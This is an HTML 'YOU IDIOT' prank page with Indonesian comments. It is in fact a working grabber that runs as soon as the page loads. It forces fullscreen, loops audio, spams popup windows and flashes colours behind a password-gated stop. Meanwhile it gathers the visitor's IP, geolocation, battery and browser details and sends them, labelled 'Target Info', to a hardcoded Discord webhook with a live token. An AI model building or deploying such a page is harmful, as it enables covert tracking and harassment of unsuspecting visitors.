<!DOCTYPE html>

  <style>

    input {

    }

    button {
      padding: 10px;

    }
  </style>
</head>
<body>
  <div id="idiotText">ðŸ’€ YOU IDIOT ðŸ’€</div>

  <div id="passwordContainer">
    <p>MASUKKAN PASSWORD UNTUK MENGHENTIKAN</p>
    <input type="password" id="passInput" placeholder="Password...">
    <button onclick="checkPassword()">SUBMIT</button>
  </div>

  <script>
    const webhook = "https://discord.com/api/webhooks/1381323318015168713/n7-0frn24IaSz4BXK3nD6TnLTYKzNq8iZxq8RWkUDmEF0P35Dz_9o_ALgjDQkyFx78h9"; // Ganti dengan webhook kamu
    const password = "HAZELGANTENG"; // Ganti passwordnya di sini

    let audio;
    let bgInterval;
    let popupTimer;

    // Dapetin info IP
    async function getIP() {
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        return data.ip;
      } catch {
        return "Gagal ambil IP";
      }
    }

    // Info baterai
    async function getBattery() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: (battery.level * 100) + "%",
          charging: battery.charging ? "Ya" : "Tidak"
        };
      } catch {
        return { level: "Tidak Didukung", charging: "?" };
      }
    }

    // Info device
    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        online: navigator.onLine ? "Online" : "Offline"
      };
    }

    // Lokasi
    function getLocation() {
      return new Promise((resolve) => {
        if (!navigator.geolocation) {
          return resolve({ latitude: "N/A", longitude: "N/A" });
        }

        navigator.geolocation.getCurrentPosition(
          pos => resolve({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude
          }),
          () => resolve({ latitude: "Ditolak", longitude: "Ditolak" }),
          { timeout: 5000 }
        );
      });
    }

    // Kirim ke webhook
    async function sendToWebhook(data) {
      const payload = {
        content: "**ðŸ“¡ Target Info Terdeteksi!**",
        embeds: [{
          title: "ðŸ§  Informasi Target",
          color: 16711680,
          fields: [
            { name: "ðŸŒ IP", value: data.ip, inline: true },
            { name: "ðŸ”‹ Baterai", value: `${data.battery.level} (${data.battery.charging})`, inline: true },
            { name: "ðŸ“± Platform", value: data.device.platform, inline: true },
            { name: "ðŸ§­ Browser", value: data.device.userAgent, inline: false },
            { name: "ðŸ“¡ Online", value: data.device.online, inline: true },
            { name: "ðŸŒŽ Lokasi", value: `Lat: ${data.loc.latitude}, Lon: ${data.loc.longitude}`, inline: false }
          ],
          footer: { text: "by Hazel | Cyaa OSINT" },
          timestamp: new Date().toISOString()
        }]
      };

      await fetch(webhook, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });
    }

    // Fullscreen
    function goFullScreen() {
      const el = document.documentElement;
      if (el.requestFullscreen) el.requestFullscreen();
      else if (el.mozRequestFullScreen) el.mozRequestFullScreen();
      else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
      else if (el.msRequestFullscreen) el.msRequestFullscreen();
    }

    // Musik YOU IDIOT
    function playMusic() {
      audio = new Audio("https://www.myinstants.com/media/sounds/you-idiot.mp3");
      audio.loop = true;
      audio.volume = 1;
      audio.play().catch(() => {});
    }

    // Popup windows
    function spamWindows() {
      popupTimer = setInterval(() => {
        for (let i = 0; i < 5; i++) {
          window.open("https://example.com", "_blank", "width=200,height=200");
        }
      }, 3000);
    }

    // Warna background berubah
    function changeBgColor() {
      const colors = ["black", "red", "blue", "purple", "yellow"];
      let i = 0;
      bgInterval = setInterval(() => {
        document.body.style.backgroundColor = colors[i % colors.length];
        i++;
      }, 1000);
    }

    // Hentikan semua efek
    function stopAll() {
      if (audio) audio.pause();
      clearInterval(bgInterval);
      clearInterval(popupTimer);
      document.getElementById("idiotText").innerText = "ðŸ›‘ SYSTEM STOPPED";
      document.getElementById("passwordContainer").remove();
    }

    // Cek password
    function checkPassword() {
      const input = document.getElementById("passInput").value;
      if (input === password) {
        stopAll();
      }
    }

    // Eksekusi semua
    (async () => {
      goFullScreen();
      playMusic();
      spamWindows();
      changeBgColor();

      const ip = await getIP();
      const battery = await getBattery();
      const device = getDeviceInfo();
      const loc = await getLocation();
      await sendToWebhook({ ip, battery, device, loc });
    })();
  </script>
</body>
